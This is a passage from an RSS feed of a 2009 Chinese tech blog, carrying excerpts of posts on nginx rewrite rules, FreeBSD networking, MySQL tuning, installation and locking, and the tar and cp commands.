^/category-([0-9]+)-b([0-9]+)-([0-9]+)-(.+)-([a-zA-Z]+)(.*).html$ /category.php?id=$1&amp;amp;brand;=$2&amp;amp;page;=$3&amp;amp;sort;=$4&amp;amp;order;=$5; rewrite ^/category-([0-9]+)-b([0-9]+)-([0-9]+)(.*).html$ /category.php?id=$1&amp;amp;brand;=$2&amp;amp;page;=$3; rewrite ^/category-([0-9]+)-b([0-9]+)(.*).html$ /category.php?id=$1&amp;amp;brand;=$2; rewrite ^/category-([0-9]+)(.*).html$ /category.php?id=$1; rewrite ^/goods-([0-9]+)(.*).html$ /goods.php?id=$1; rewrite ^/article_cat-([0-9]+)-([0-9]+)-(.+)-([a-zA-Z]+)(.*).html$ /article_cat.php?id=$1&amp;amp;page;=$2&amp;amp;sort;=$3&amp;amp;order;=$4; rewrite ^/article_cat-([0-9]+)-([0-9]+)(.*).html$ /article_cat.php?id=$1&amp;amp;page;=$2; rewrite ^/article_cat-([0-9]+)(.*).html$ /article_cat.php?id=$1; rewrite ^/article-([0-9]+)(.*).html$ /article.php?id=$1; rewrite ^/brand-([0-9]+)-c([0-9]+)-([0-9]+)-(.+)-([a-zA-Z]+).html /brand.php?id=$1&amp;amp;cat;=$2&amp;amp;page;=$3&amp;amp;sort;=$4&amp;amp;order;=$5; rewrite ^/brand-([0-9]+)-c([0-9]+)-([0-9]+)(.*).html /brand.php?id=$1&amp;amp;cat;=$2&amp;amp;page;=$3; rewrite ^/brand-([0-9]+)-c([0-9]+)(.*).html /brand.php?id=$1&amp;amp;cat;=$2; rewrite ^/brand-([0-9]+)(.*).html /brand.php?id=$1; rewrite ^/tag-(.*).html /search.php?keywords=$1; rewrite ^/snatch-([0-9]+).html$ /snatch.php?id=$1; rewrite ^/group_buy-([0-9]+).html$ /group_buy.php?act=view&amp;amp;id;=$1; rewrite ^/auction-([0-9]+).</description>
    </item>
    
    <item>
      <title>freebsd下在一块网卡下增加删除ip</title>
      <link>http://example.org/2009/04/01/freebsd-inc-add-ip-del-ip/</link>
      <pubDate>Wed, 01 Apr 2009 10:21:18 +0000</pubDate>
      
      <guid>http://example.org/2009/04/01/freebsd-inc-add-ip-del-ip/</guid>
      <description>在bge0网卡上增加ip别名：
ifconfig bge0 add alias xxx.xxx.xxx.xxx netmask xxx.xxx.xxx.xxx up 说明：这里掩码的设定是这样的，同一个网断的第一个ip掩码按照真实的掩码设置。在这个网段下面再增加ip时，掩码就是255.255.255.255了！切记！
在bge0网卡上删除ip别名：
ifconfig bge0 -alias xxx.xxx.xxx.xxx 下路由配置
配置路由 在同一个局域网上的计算机是直接连通的，但是不同的网络上的计算机并没有直接相连，只能通过一台特殊的专用计算机 -路由器来完成连通。路由器连接有多个网络界面，每一个网络界面连接到一个相应的网络上，具有一个这个网络上的IP地址，因此，网络内部的计算机可以和路由器本身相互通信。 当网络内部的计算机要向外连接的时候，数据包实际是交给路由器的，路由器再将数据包从连接外部网络的网络界面上转发出去，数据包经过这样一个一个的转发过程，直到到达目的地。对于网络内部的计算机来讲，没有必要了解数据包的整个转发的路径和经过的所有路由器的信息，只需要知道第一步需要将数据包交给哪一个路由器就可以了。因此，计算机必须知道与它直接相连接的路由器的有关信息，这个过程就是路由配置的过程。 进行路由配置有两种途径，一种是由管理员设置所有的路由信息，由于数据是手工设置，因此称为静态路由设置。另一个是启动一个支持路由交换协议的进程，自动侦测网络上的所有路由器及其相关信息，这称为动态路由设置。 在 FreeBSD系统不用做专门路由器的情况下，一般地说使用静态路由设置足够满足网络通信的需要。
缺省网关 在最简单的情况下，一个网络向外通过一个路由器完成向外连接，这个路由器被称为缺省网关，它负责几乎所有的向外连接任务。假设缺省网关的地址为 192.168.1.254， 则设置缺省网关的命令为：
freebsd# route add default 192.168.1.254 add net default: gateway 192.168.1.254 //成功配置缺省网关 add net default: gateway 192.168.1.254: File exists //如果系统已经设置了缺省网关，那么系统会报告错误 freebsd# route delete default delete net default //成功删除缺省网关 freebsd# route flush //清除所有路由 default 192.168.1.254 done
上述命令执行之后立即生效，因此，可能会影响已经建立的连接。为了保存缺省网关的配置，同样也需要将配置写入系统配置文件 rc.conf。 defaultrouter=&amp;ldquo;192.168.1.254&amp;rdquo; 仅仅配置缺省网关的大部分情况是在计算机处于整个互联网的边缘，网络中仅仅需要一个路由器接入互联网就可以了。 2) 其他静态路由设置 更复杂的情况下，计算机所处的网络与多个网络相连接，网络中存在多个路由器，每个路由器负责到一些网络的转发任务，而不负责到全部网络的转发任务。这种情况下，如果将所有的数据都发给一个路由器，那么原则上它只能正确转发目的是它自己负责的网络的数据。实际使用当中，路由器将使用 ICMP协议，向发送数据的主机报告路由错误。 因此，应该在计算机中配置这个网络上所有路由器及这些路由器负责的相应网络的路由数据，以便计算机选择正确的路由器转发数据包。同样，也必须使用 route命令增加到各个网络的静态路由数据。</description>
    </item>
    
    <item>
      <title>如何把wordpress博客搬到Google App Engine</title>
      <link>http://example.org/2009/03/31/e5a682e4bd95e68a8awordpresse58d9ae5aea2e690ace588b0google-app-engine/</link>
      <pubDate>Tue, 31 Mar 2009 17:03:03 +0000</pubDate>
      
      <guid>http://example.org/2009/03/31/e5a682e4bd95e68a8awordpresse58d9ae5aea2e690ace588b0google-app-engine/</guid>
      <description></description>
    </item>
    
    <item>
      <title>优化MySQL数据库性能的八种方法</title>
      <link>http://example.org/2009/03/30/e4bc98e58c96mysqle695b0e68daee5ba93e680a7e883bde79a84e585abe7a78de696b9e6b395/</link>
      <pubDate>Mon, 30 Mar 2009 20:01:42 +0000</pubDate>
      
      <guid>http://example.org/2009/03/30/e4bc98e58c96mysqle695b0e68daee5ba93e680a7e883bde79a84e585abe7a78de696b9e6b395/</guid>
      <description>1、选取最适用的字段属性 MySQL可以很好的支持大数据量的存取，但是一般说来，数据库中的表越小，在它上面执行的查询也就会越快。因此，在创建表的时候，为了获得更好的 性能，我们可以将表中字段的宽度设得尽可能小。例如，在定义邮政编码这个字段时，如果将其设置为CHAR(255),显然给数据库增加了不必要的空间， 甚至使用VARCHAR这种类型也是多余的，因为CHAR(6)就可以很好的完成任务了。同样的，如果可以的话，我们应该使用MEDIUMINT而不是 BIGIN来定义整型字段。
另外一个提高效率的方法是在可能的情况下，应该尽量把字段设置为NOT NULL，这样在将来执行查询的时候，数据库不用去比较NULL值。
对于某些文本字段，例如“省份”或者“性别”，我们可以将它们定义为ENUM类型。因为在MySQL中，ENUM类型被当作数值型数据来处理，而数 值型数据被处理起来的速度要比文本类型快得多。这样，我们又可以提高数据库的性能。
2、使用连接（JOIN）来代替子查询(Sub-Queries)
MySQL从4.1开始支持SQL的子查询。这个技术可以使用SELECT语句来创建一个单列的查询结果，然后把这个结果作为过滤条件用在另一个查 询中。例如，我们要将客户基本信息表中没有任何订单的客户删除掉，就可以利用子查询先从销售信息表中将所有发出订单的客户ID取出来，然后将结果传递给 主查询，如下所示：
DELETE FROM customerinfo WHERE CustomerID NOT in (SELECT CustomerID FROM salesinfo )
使用子查询可以一次性的完成很多逻辑上需要多个步骤才能完成的SQL操作，同时也可以避免事务或者表锁死，并且写起来也很容易。但是，有些情况下， 子查询可以被更有效率的连接（JOIN）.. 替代。例如，假设我们要将所有没有订单记录的用户取出来，可以用下面这个查询完成：
SELECT * FROM customerinfo WHERE CustomerID NOT in (SELECT CustomerID FROM salesinfo )
如果使用连接（JOIN）.. 来完成这个查询工作，速度将会快很多。尤其是当salesinfo表中对CustomerID建有索引的话，性能将 会更好，查询如下：
SELECT * FROM customerinfo LEFT JOIN salesinfoON customerinfo.CustomerID=salesinfo. CustomerID WHERE salesinfo.CustomerID IS NULL
连接（JOIN）.. 之所以更有效率一些，是因为 MySQL不需要在内存中创建临时表来完成这个逻辑上的需要两个步骤的查询工作。
3、使用联合(UNION)来代替手动创建的临时表
MySQL 从 4.0 的版本开始支持 UNION 查询，它可以把需要使用临时表的两条或更多的 SELECT 查询合并的一个查询中。在客户 端的查询会话结束的时候，临时表会被自动删除，从而保证数据库整齐、高效。使用 UNION 来创建查询的时候，我们只需要用 UNION作为关键字把 多个 SELECT 语句连接起来就可以了，要注意的是所有 SELECT 语句中的字段数目要想同。下面的例子就演示了一个使用 UNION的查 询。</description>
    </item>
    
    <item>
      <title>Alexa Traffic Rank PHP5 Class</title>
      <link>http://example.org/2009/03/29/alexa-traffic-rank-php5-class/</link>
      <pubDate>Sun, 29 Mar 2009 16:35:31 +0000</pubDate>
      
      <guid>http://example.org/2009/03/29/alexa-traffic-rank-php5-class/</guid>
      <description>This PHP5 class utilizes the web service provided by Alexa/Amazon to get the traffic information about the site. You&amp;rsquo;ll need to sign up for an account at Alexa to get the pair (access key and secret key). The first 10,000 queries per month are free. view plaincopy to clipboardprint?
mParams = array( &#39;Service&#39;=&amp;gt;&#39;AlexaWebInfoService&#39;, &#39;AWSAccessKeyId&#39;=&amp;gt;&#39;YOUR ACCESS KEY&#39;, // access key id &#39;Operation&#39;=&amp;gt;&#39;UrlInfo&#39;, &#39;ResponseGroup&#39;=&amp;gt;&#39;Rank&#39;, &#39;Url&#39;=&amp;gt;NULL, &#39;Timestamp&#39;=&amp;gt;gmdate(&#39;Y-m-d\TH:i:s.000\Z&#39;), &#39;Signature&#39;=&amp;gt;NULL, ); $this-&amp;gt;prepareSignature(); } /** ref: http://developer.</description>
    </item>
    
    <item>
      <title>[原创] MySQL Proxy 学习笔记</title>
      <link>http://example.org/2009/03/29/e58e9fe5889b-mysql-proxy-e5ada6e4b9a0e7ac94e8aeb0/</link>
      <pubDate>Sun, 29 Mar 2009 16:25:50 +0000</pubDate>
      
      <guid>http://example.org/2009/03/29/e58e9fe5889b-mysql-proxy-e5ada6e4b9a0e7ac94e8aeb0/</guid>
      <description>作者：heiyeluren 时间：2008-1-28 博客：http://blog.csdn.net/heiyeshuwu
【 测试平台 】
**服务器端： **OS：FreeBSD 6.2 Lua： 5.1.1 MySQL Server：4.1.22-log MySQL Proxy： 0.6.0 客户端： OS：Windows XP Pro SP2 PHP： PHP 5.2.4 (cli) MySQL Client： Ver 14.13 Distrib 5.1.19-beta for Win32
注意：本文使用的是最新版本 MySQL Proxy alpha 0.6.0 ，如果是0.5.0版本可能部分选项和操作不一致，同样的，以后如果除了新版本，请参照新版本文档。 【 MySQL Proxy 安装 】
$ fetch http://mirror.mysql-partners-jp.biz/Downloads/MySQL-Proxy/mysql-proxy-0.6.0-freebsd6-x86.tar.gz $ tar zxvf mysql-proxy-0.6.0-freebsd6-x86.tar.gz $ cd mysql-proxy-0.6.0-freebsd6-x86 $ cp sbin/mysql-proxy /usr/local/sbin/
如果无法正常使用，请检查相应的其他组件是否安装了，mysql-proxy 需要依赖 lua、libtool、glib、libevent 等库。 【 初步使用 】
执行 mysql-proxy &amp;ndash;help-all 查看所有的设置选项，比较重要的选项大致描述一下功能：
管理功能选项</description>
    </item>
    
    <item>
      <title>[转]MySQL与事务</title>
      <link>http://example.org/2009/03/29/e8bdacmysqle4b88ee4ba8be58aa1/</link>
      <pubDate>Sun, 29 Mar 2009 12:51:33 +0000</pubDate>
      
      <guid>http://example.org/2009/03/29/e8bdacmysqle4b88ee4ba8be58aa1/</guid>
      <description>2006年08月05日 星期六 下午 02:23 作者：老王 MySQL5.X都已经发布好久了，但是还有很多人认为MySQL是不支持事务处理的，这不得不怪他们是孤陋寡闻的，其实，只要你的MySQL版本支持BDB或InnoDB表类型，那么你的MySQL就具有事务处理的能力。这里面，又以InnoDB表类型用的最多，虽然后来发生了诸如Oracle收购InnoDB等令MySQL不爽的事情，但那些商业上的斗争与技术无关，下面以InnoDB表类型为例简单说一下MySQL中的事务。 先来明确一下事务涉及的相关知识： 事务都应该具备ACID特征。所谓ACID是Atomic（原子性），Consistent（一致性），Isolated（隔离性），Durable（持续性）四个词的首字母所写，下面以“银行转帐”为例来分别说明一下它们的含义： 原子性：组成事务处理的语句形成了一个逻辑单元，不能只执行其中的一部分。换句话说，事务是不可分割的最小单元。比如：银行转帐过程中，必须同时从一个帐户减去转帐金额，并加到另一个帐户中，只改变一个帐户是不合理的。 一致性：在事务处理执行前后，数据库是一致的。也就是说，事务应该正确的转换系统状态。比如：银行转帐过程中，要么转帐金额从一个帐户转入另一个帐户，要么两个帐户都不变，没有其他的情况。 隔离性：一个事务处理对另一个事务处理没有影响。就是说任何事务都不可能看到一个处在不完整状态下的事务。比如说，银行转帐过程中，在转帐事务没有提交之前，另一个转帐事务只能处于等待状态。 持续性：事务处理的效果能够被永久保存下来。反过来说，事务应当能够承受所有的失败，包括服务器、进程、通信以及媒体失败等等。比如：银行转帐过程中，转帐后帐户的状态要能被保存下来。 再来看看哪些问题会用到事务处理：
这里不说“银行转帐”的例子了，说一个大家实际更容易遇到的“网上购书”的例子。先假设一下问题的背景：网上购书，某书（数据库编号为123）只剩最后一本，而这个时候，两个用户对这本书几乎同时发出了购买请求，让我们看看整个过程： 在具体分析之前，先来看看数据表的定义： create table book ( book_id unsigned int(10) not null auto_increment, book_name varchar(100) not null, book_price float(5, 2) not null, #我假设每本书的价格不会超过999.99元 book_number int(10) not null, primary key (book_id) ) type = innodb; #engine = innodb也行 对于用户甲来说，他的动作稍微比乙快一点点，其购买过程所触发的动作大致是这样的： 1. SELECT book_number FROM book WHERE book_id = 123; book_number大于零，确认购买行为并更新book_number 2. UPDATE book SET book_number = book_number - 1 WHERE book_id = 123; 购书成功 而对于用户乙来说，他的动作稍微比甲慢一点点，其购买过程所触发的动作和甲相同： 1.</description>
    </item>
    
    <item>
      <title>freebsd vmstat结果内容的解释</title>
      <link>http://example.org/2009/03/29/freebsd-vmstate7bb93e69e9ce58685e5aeb9e79a84e8a7a3e9878a/</link>
      <pubDate>Sun, 29 Mar 2009 03:17:23 +0000</pubDate>
      
      <guid>http://example.org/2009/03/29/freebsd-vmstate7bb93e69e9ce58685e5aeb9e79a84e8a7a3e9878a/</guid>
      <description>top是给Linux设计的。在FreeBSD VM里面的Free概念和其他OS完全不同，使用top查看Free内存对于FreeBSD来说可以说没什么意义。正确的方法是看vmstat。
作者:南非蜘蛛
procs memory page disk faults cpu r b w swap free re mf mi po fr de sr f0 s0 s1 s2 in sy cs us sy id 0 0 0 14888 19120 0 4 2 11 10 0 0 0 0 0 8 198 2158 98 11 19 69
SWAP的单位应该是K，不是M。还有两个比较重要的参数是PI、PO，表示内存的调入、调出页面，单位也是K，但是多大值作为一个衡量标准，我也不清楚，不知道是否有经验值。
还有，最好使用vmstat t [n]命令，例如 vmstat 5 5,表示在T（5）秒时间内进行N（5）次采样。如果只使用vmstat，无法反映真正的系统情况，试一下，看看结果就知道了。
procs: r&amp;ndash;&amp;gt;在运行队列中等待的进程数 b&amp;ndash;&amp;gt;在等待io的进程数 w&amp;ndash;&amp;gt;可以进入运行队列但被替换的进程
memoy swap&amp;ndash;&amp;gt;现时可用的交换内存（k表示） free&amp;ndash;&amp;gt;空闲的内存（k表示）
pages re－－》回收的页面 mf－－》非严重错误的页面 pi－－》进入页面数（k表示） po－－》出页面数（k表示） fr－－》空余的页面数（k表示） de－－》提前读入的页面中的未命中数 sr－－》通过时钟算法扫描的页面</description>
    </item>
    
    <item>
      <title>Mysql安装&amp;同步</title>
      <link>http://example.org/2009/03/28/mysqle5ae89e8a385e5908ce6ada5/</link>
      <pubDate>Sat, 28 Mar 2009 20:59:25 +0000</pubDate>
      
      <guid>http://example.org/2009/03/28/mysqle5ae89e8a385e5908ce6ada5/</guid>
      <description>装mysql压缩文件格式的MySQL二进制分发版
一． 安装的软件：
1. Red Hat Enterprise Linux 4.0 update5
mysql-5.0.45-linux-i686-icc-glibc23.tar.gz 二、装步骤如下：
首先检查是否安装了Red Hat Enterprise Linux 4.0中自带的mysql服务，检查系统是否安装了mysql软件包，在终端执行如下命令：
Shell&amp;gt; rpm –aq | grep mysql –ri
显示如下：
mysql-4.1.12-3.RHEL4.1
Mod_auth_mysql-2.6.1-2.2 等软件包
在安装mysql二进制分发版之前请先卸载mysql rpm软件包
Shell&amp;gt; rpm －e mysql-4.1.12-3.RHEL4.1 将相关的rpm包逐一掉。
shell&amp;gt; groupadd mysql
shell&amp;gt; useradd -g mysql mysql 为mysql增加一个登录用户和组
shell&amp;gt; cd /usr/local
shell&amp;gt; tar –zxvf mysql-5.0.45-linux-i686-icc-glibc23.tar.gz
shell&amp;gt; ln -s mysql-5.0.45-linux-i686-icc-glibc23 mysql
shell&amp;gt; cd mysql
shell&amp;gt; scripts/mysql_install_db &amp;ndash;user=mysql
/如果你用root运行命令，应当使用&amp;ndash;user选项。选项的值应与你在第一步为运行服务器所创建的登录账户相同。如果你用该用户登录来运行命令，可以省略&amp;ndash;user选项。/
shell&amp;gt; chown -R root .
shell&amp;gt; chown -R mysql data</description>
    </item>
    
    <item>
      <title>my.cnf 注释</title>
      <link>http://example.org/2009/03/28/mycnf-e6b3a8e9878a/</link>
      <pubDate>Sat, 28 Mar 2009 16:38:29 +0000</pubDate>
      
      <guid>http://example.org/2009/03/28/mycnf-e6b3a8e9878a/</guid>
      <description>从 hi!admin 抄来的一份配置.注释得非常好.精
#BEGIN CONFIG INFO #DESCR: 4GB RAM, 只使用InnoDB, ACID, 少量的连接, 队列负载大 #TYPE: SYSTEM #END CONFIG INFO
此mysql配置文件例子针对4G内存 主要使用INNODB #处理复杂队列并且连接数量较少的mysql服务器
将此文件复制到/etc/my.cnf 作为全局设置, mysql-data-dir/my.cnf 作为服务器指定设置 (@localstatedir@ for this installation) 或者放入 ~/.my.cnf 作为用户设置. 在此配置文件中, 你可以使用所有程序支持的长选项. 如果想获悉程序支持的所有选项 请在程序后加上&amp;quot;&amp;ndash;help&amp;quot;参数运行程序. 关于独立选项更多的细节信息可以在手册内找到 以下选项会被MySQL客户端应用读取. 注意只有MySQL附带的客户端应用程序保证可以读取这段内容. 如果你想你自己的MySQL应用程序获取这些值 需要在MySQL客户端库初始化的时候指定这些选项 [client] #password = [your_password] port = @MYSQL_TCP_PORT@ socket = @MYSQL_UNIX_ADDR@
*** 应用定制选项 *** MySQL 服务端 [mysqld]
一般配置选项 port = @MYSQL_TCP_PORT@ socket = @MYSQL_UNIX_ADDR@
back_log 是操作系统在监听队列中所能保持的连接数, 队列保存了在MySQL连接管理器线程处理之前的连接. 如果你有非常高的连接率并且出现&amp;quot;connection refused&amp;quot; 报错, 你就应该增加此处的值.</description>
    </item>
    
    <item>
      <title>InnoDB行锁特点</title>
      <link>http://example.org/2009/03/28/innodbe8a18ce99481e789b9e782b9/</link>
      <pubDate>Sat, 28 Mar 2009 16:15:24 +0000</pubDate>
      
      <guid>http://example.org/2009/03/28/innodbe8a18ce99481e789b9e782b9/</guid>
      <description>InnoDB行锁是通过给索引上的索引项加锁来实现的，这一点MySQL与ORACLE不同，后者是通过在数据块中对相应数据行加锁来实现的。InnoDB这种行锁实现特点意味着：只有通过索引条件检索数据，InnoDB才使用行级锁，否则，InnoDB将使用表锁！
在实际应用中，要特别注意InnoDB行锁的这一特性，不然的话，可能导致大量的锁冲突，从而影响并发性能。下面我们通过一些实际例子，来加以说明。
（1）在不通过索引条件查询的时候，InnoDB确实使用的是表锁，而不是行锁。
下面的例子中，开始tab_no_index表没有索引：
mysql&amp;gt; create table tab_no_index(id int,name varchar(10)) engine=innodb; Query OK, 0 rows affected (0.15 sec) mysql&amp;gt; insert into tab_no_index values(1,&#39;1&#39;),(2,&#39;2&#39;),(3,&#39;3&#39;),(4,&#39;4&#39;); Query OK, 4 rows affected (0.00 sec) Records: 4 Duplicates: 0 Warnings: 0 InnoDB存储引擎的表在不使用索引时使用表锁例子 session_1 session_2 mysql&amp;gt; set autocommit=0; Query OK, 0 rows affected (0.00 sec) mysql&amp;gt; select * from tab_no_index where id = 1 ; +------+------+ | id | name | +------+------+ | 1 | 1 | +------+------+ 1 row in set (0.</description>
    </item>
    
    <item>
      <title>InnoDB和MyISAM的差别</title>
      <link>http://example.org/2009/03/28/innodbe5928cmyisame79a84e5b7aee588ab/</link>
      <pubDate>Sat, 28 Mar 2009 16:11:42 +0000</pubDate>
      
      <guid>http://example.org/2009/03/28/innodbe5928cmyisame79a84e5b7aee588ab/</guid>
      <description>InnoDB和MyISAM是在使用MySQL最常用的两个表类型，各有优缺点，视具体应用而定。基本的差别为：MyISAM类型不支持事务处理等 高级处理，而InnoDB类型支持。MyISAM类型的表强调的是性能，其执行数度比InnoDB类型更快，但是不提供事务支持，而InnoDB提供事务 支持已经外部键等高级数据库功能。 MyIASM是IASM表的新版本，有如下扩展：
二进制层次的可移植性。
NULL列索引。
对变长行比ISAM表有更少的碎片。
支持大文件。
更好的索引压缩。
更好的键吗统计分布。
更好和更快的auto_increment处理。 每个MyISAM表最大索引数是64。 这可以通过重新编译来改变。每个索引最大的列数是16个。
以下是一些细节和具体实现的差别： 1.InnoDB不支持FULLTEXT类型的索引。 2.InnoDB 中不保存表的具体行数，也就是说，执行select count() from table时，InnoDB要扫描一遍整个表来计算有多少行，但是MyISAM只要简单的读出保存好的行数即可。注意的是，当count()语句包含 where条件时，两种表的操作是一样的。 3.对于AUTO_INCREMENT类型的字段，InnoDB中必须包含只有该字段的索引，但是在MyISAM表中，可以和其他字段一起建立联合索引。 4.DELETE FROM table时，InnoDB不会重新建立表，而是一行一行的删除。 5.LOAD TABLE FROM MASTER操作对InnoDB是不起作用的，解决方法是首先把InnoDB表改成MyISAM表，导入数据后再改成InnoDB表，但是对于使用的额外的InnoDB特性（例如外键）的表不适用。
另外，InnoDB表的行锁也不是绝对的，如果在执行一个SQL语句时MySQL不能确定要扫描的范围，InnoDB表同样会锁全表，例如update table set num=1 where name like “%aaa%” 任何一种表都不是万能的，只用恰当的针对业务类型来选择合适的表类型，才能最大的发挥MySQL的性能优势。 http://dev.mysql.com/doc/refman/5.1/zh/storage-engines.html</description>
    </item>
    
    <item>
      <title>MySQL 語法 詳細執行時間 與 CPU/記憶體使用</title>
      <link>http://example.org/2009/03/28/mysql-e8aa9ee6b395-e8a9b3e7b4b0e59fb7e8a18ce69982e99693-e88887-cpue8a898e686b6e9ab94e4bdbfe794a8/</link>
      <pubDate>Sat, 28 Mar 2009 15:34:23 +0000</pubDate>
      
      <guid>http://example.org/2009/03/28/mysql-e8aa9ee6b395-e8a9b3e7b4b0e59fb7e8a18ce69982e99693-e88887-cpue8a898e686b6e9ab94e4bdbfe794a8/</guid>
      <description>查看 MySQL 語法 詳細執行時間 與 CPU/記憶體使用量: MySQL Query Profiler MySQL 的 SQL 語法調整主要都是使用 EXPLAIN, 但是這個並沒辦法知道詳細的 Ram(Memory)/CPU 等使用量.
於 MySQL 5.0.37 以上開始支援 MySQL Query Profiler, 可以查詢到此 SQL 會執行多少時間, 並看出 CPU/Memory 使用量, 執行過程中 System lock, Table lock 花多少時間等等.
MySQL Query Profile 詳細介紹可見: Using the New MySQL Query Profiler (2007.04.05 發表)
效能分析主要分下述三種(轉載自上篇):
Bottleneck analysis - focuses on answering the questions: What is my database server waiting on; what is a user connection waiting on; what is a piece of SQL code waiting on?</description>
    </item>
    
    <item>
      <title>Nginx &#43; PHP mysql_pconnect = Database errors (Too many connections)</title>
      <link>http://example.org/2009/03/28/nginx-php-mysql_pconnect-database-errors-too-many-connections/</link>
      <pubDate>Sat, 28 Mar 2009 15:16:29 +0000</pubDate>
      
      <guid>http://example.org/2009/03/28/nginx-php-mysql_pconnect-database-errors-too-many-connections/</guid>
      <description>If you&amp;rsquo;re using NGinx spawn-cgi or FPM with PHP and calling mysql_pconnect, you are likely going to experience frequent database crashes and &amp;ldquo;Too many connections&amp;rdquo; errors.
This took a while to trace, but once you understand the issue, it all makes sense.
mysql_pconnect opens a &amp;ldquo;persistent&amp;rdquo; connection to the database. From the documentation: &amp;ldquo;the connection to the SQL server will not be closed when the execution of the script ends. Instead, the link will remain open for future use (mysql_close() will not close links established by mysql_pconnect()).</description>
    </item>
    
    <item>
      <title>Installing MySQL 5.1 on FreeBSD</title>
      <link>http://example.org/2009/03/28/installing-mysql-51-on-freebsd/</link>
      <pubDate>Sat, 28 Mar 2009 15:14:05 +0000</pubDate>
      
      <guid>http://example.org/2009/03/28/installing-mysql-51-on-freebsd/</guid>
      <description>This step by step tutorial is everything you need to install MySQL 5.1 (from source) on a virgin FreeBSD 4.x - 7.x machine.
Step 1: Install wget
cd /usr/ports/ftp/wget make make install Step 2: Download MySQL 5.1 source code
mkdir /usr/tmp cd /usr/tmp wget &amp;quot;http://dev.mysql.com/get/Downloads/MySQL-5.1/mysql-5.1.24-rc.tar.gz/from/http://mysql.he.net/&amp;quot; tar xvzf mysql-5.1.24-rc.tar.gz Step 3: Create mysql user
adduser Follow the prompts to create a mysql user and mysql group with a default directory of /usr/local/mysql</description>
    </item>
    
    <item>
      <title>tar zxfk filename.tar.gz -k,--keep-old-files 不覆盖已存在文件</title>
      <link>http://example.org/2009/03/26/tar-zxfk-filenametargz-k-keep-old-files-e4b88de8a686e79b96e5b7b2e5ad98e59ca8e69687e4bbb6/</link>
      <pubDate>Thu, 26 Mar 2009 10:43:34 +0000</pubDate>
      
      <guid>http://example.org/2009/03/26/tar-zxfk-filenametargz-k-keep-old-files-e4b88de8a686e79b96e5b7b2e5ad98e59ca8e69687e4bbb6/</guid>
      <description>版权声明：可以任意转载，转载时请务必以超链接形式标明文章原始出处和作者信息及本声明。 http://windtear.net/archives/2005/09/22/000777.html
倒数据当然推荐rsync 不过当文件数超级多 或者网络条件等不具备时 tar 打包就是首选了
数据运到目的地后 解包时需要注意别覆盖
tar 工具的 -k 参数就提供干这事 -k,&amp;ndash;keep-old-files 不覆盖已存在文件
-k, --keep-old-files keep existing files; don&#39;t overwrite them from archive 如: tar zxfk filename.tar.gz</description>
    </item>
    
    <item>
      <title>tar命令详解 (推荐)</title>
      <link>http://example.org/2009/03/26/tare591bde4bba4-excludee58f82e695b0/</link>
      <pubDate>Thu, 26 Mar 2009 07:02:17 +0000</pubDate>
      
      <guid>http://example.org/2009/03/26/tare591bde4bba4-excludee58f82e695b0/</guid>
      <description>tar [-cxtzjvfpPN] 文件与目录 …
参数： -c ：建立一个压缩文件的参数指令(create 的意思)； -x ：解开一个压缩文件的参数指令！ -t ：查看 tarfile 里面的文件！ 特别注意，在参数的下达中， c/x/t 仅能存在一个！不可同时存在！因为不可能同时压缩与解压缩。
-z ：是否同时具有 gzip 的属性？亦即是否需要用 gzip 压缩？ -j ：是否同时具有 bzip2 的属性？亦即是否需要用 bzip2 压缩？ -v ：压缩的过程中显示文件！这个常用，但不建议用在背景执行过程！ -f ：使用档名，请留意，在 f 之后要立即接档名喔！不要再加参数！ 例如使用『 tar -zcvfP tfile sfile』就是错误的写法，要写成『 tar -zcvPf tfile sfile』才对喔！
-p ：使用原文件的原来属性（属性不会依据使用者而变） -P ：可以使用绝对路径来压缩！ -N ：比后面接的日期(yyyy/mm/dd)还要新的才会被打包进新建的文件中！ –exclude FILE：在压缩的过程中，不要将 FILE 打包！ 范例：
范例一：将整个 /etc 目录下的文件全部打包成为 /tmp/etc.tar
[root@linux ~]# tar -cvf /tmp/etc.tar /etc &amp;lt;==仅打包，不压缩！
[root@linux ~]# tar -zcvf /tmp/etc.</description>
    </item>
    
    <item>
      <title>cp 命令</title>
      <link>http://example.org/2009/03/26/cp-e591bde4bba4/</link>
      <pubDate>Thu, 26 Mar 2009 02:30:03 +0000</pubDate>
      
      <guid>http://example.org/2009/03/26/cp-e591bde4bba4/</guid>
      <description>cp [-R [-H | -L | -P]] [-f | -i | -n] [-alpv] source_file target_file cp [-R [-H | -L | -P]] [-f | -i | -n] [-alpv] source_file &amp;hellip; target_directory
-i 覆盖确认 -n 覆盖不确认 -v 显示详情 -R 全部目录 -p 权限和source_file 一样
其它的暂时没用到,先写到这里</description>
    </item>
    
    <item>
      <title>FreeBSD常见问题集合</title>
      <link>http://example.org/2009/03/25/freebsde5b8b8e8a781e997aee9a298e99b86e59088/</link>
      <pubDate>Wed, 25 Mar 2009 22:45:36 +0000</pubDate>
      
      <guid>http://example.org/2009/03/25/freebsde5b8b8e8a781e997aee9a298e99b86e59088/</guid>
      <description>1.如何使用脚本获得PID 参见脚本pid.sh, 如下:
$ cat pid.sh #!/bin/sh pid=`ps -aux | grep $1 | grep -v grep | awk &#39;{print $2}&#39;` echo $pid &amp;lt; $1.pid $./pid.sh sshd 将文件名从大写转换为小写 参见脚本mklower.sh, 如下:
#!/bin/sh for file in $1; do newfile=`echo &amp;quot;$file&amp;quot; | tr &amp;quot;[:upper:]&amp;quot; &amp;quot;[:lower:]&amp;quot;` mv &amp;quot;$file&amp;quot; &amp;quot;$newfile&amp;quot; done $ mklower.sh *.JPG 子目录按大小排序
$du -s * | sort -n
ls显示颜色
$ls -G #显示属性颜色 $ls -F #显示属性字符 $ls -FG
快速安装package 你可以先设定 PACKAGEROOT，指定用该站点的package，安装时自动寻找对应pakage，而且你不需要知道版本，只要知道package名称即可，会自动安装package的最新版，中文的部分只要加上 zh-，像是 zh-xcin。
# setenv PACKAGEROOT ftp://ftp.</description>
    </item>
    
    <item>
      <title>如何将FreeBSD复制到另一颗硬盘 ?</title>
      <link>http://example.org/2009/03/25/e5a682e4bd95e5b086freebsde5a48de588b6e588b0e58fa6e4b880e9a297e7a1ace79b98/</link>
      <pubDate>Wed, 25 Mar 2009 18:51:31 +0000</pubDate>
      
      <guid>http://example.org/2009/03/25/e5a682e4bd95e5b086freebsde5a48de588b6e588b0e58fa6e4b880e9a297e7a1ace79b98/</guid>
      <description>如何将Linux或FreeBSD复制到另一颗硬盘 ? Linux上的系统复制很简单，使用cp -ax将partition资料复制过去，重开机後设定lilo就可以了。 FreeBSD也可以用cp来复制文档，但是对于复制整个文档系统并不是好方法。 这里介绍使用dump和restore来做：
